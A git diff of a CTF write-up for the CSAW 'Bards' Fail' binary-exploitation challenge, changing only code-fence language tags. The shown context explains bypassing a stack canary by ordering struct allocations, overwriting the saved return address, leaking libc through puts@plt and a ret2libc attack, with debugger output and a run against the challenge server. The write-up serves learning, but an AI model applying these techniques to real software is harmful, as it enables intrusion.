@@ -24,7 +24,7 @@ tags:
 we're given the challenge binary along with the libc 
 
 first off , lets take a look at the mitigations enabled 
-```gdb
+```console
 CANARY    : ENABLED
 FORTIFY   : disabled
 NX        : ENABLED
@@ -35,7 +35,7 @@ RELRO     : Partial
 ## Functionality
 
 This is what the challenge binary looked like 
-```
+```console
 *** Welcome to the Bards' Fail! ***
 
 Ten bards meet in a tavern.
@@ -58,7 +58,7 @@ We control the weapon and name of each bard , which are then stored on the stack
 
 each Bard is stored in a sort of structure on the stack ... looking into it further , we see that the good and evil structs are not quite the same 
 
-```
+```asm
 'good' allocation -> 48 bytes
 0240| 0x7ffdeef25150 --> 0xf0014006c 
 0248| 0x7ffdeef25158 ("AAAAAAAA")  <-input 
@@ -81,13 +81,13 @@ each Bard is stored in a sort of structure on the stack ... looking into it furt
 
 ## Exploitation
 since evil allocates more bytes I used them to overflow the stack but was greeted with this message ...
-```
+```bash
 AAAAAAAAAAAAAAAAAAAA is arrested.
 *** stack smashing detected ***:
 ```
 we can see our canary is at the offset 488 from the start of our input and since we give 56*10 bytes we end up corrupting it. The solution is to get our canary to overlap with our input string (instead of the constant data fields of the struct) so that we can choose to not overwrite it . Placing a "good" block at the start ends up doing that for us 
 
-```
+```asm
 second last 'evil' block 
 0680| 0x7ffcb4bcd168 --> 0x63 ('c')
 0688| 0x7ffcb4bcd170 --> 0x4032000000000000 ('')
@@ -105,7 +105,7 @@ last 'evil' block
 ```
 okay.. so the canary's safe but the data from the last evil struct overwrites the saved rip , lucky for us the 'good' allocation has its input starting from ```param_1 + 8``` which is exactly where the saved rip will be . All we do is make a 'good' allocation at the end instead and give in our payload to take control of rip.
 
-```
+```bash
 Stopped reason: SIGSEGV
 0x0000414141414141 in ?? ()
 ```
@@ -207,7 +207,7 @@ if __name__== "__main__":
 The idea to get leaks was to call ```puts@plt``` using a GOT address as the argument ,Then call main again;to then which we give the payload to finally execute a ret2libc
 
 
-```
+```console
 pwn-solo@m4chin3:~/ctf/csaw/bard$ python3 exploit.py remote
 [+] Opening connection to pwn.chal.csaw.io on port 5019: Done
 [*] base 0x7f9f7fe3a000 
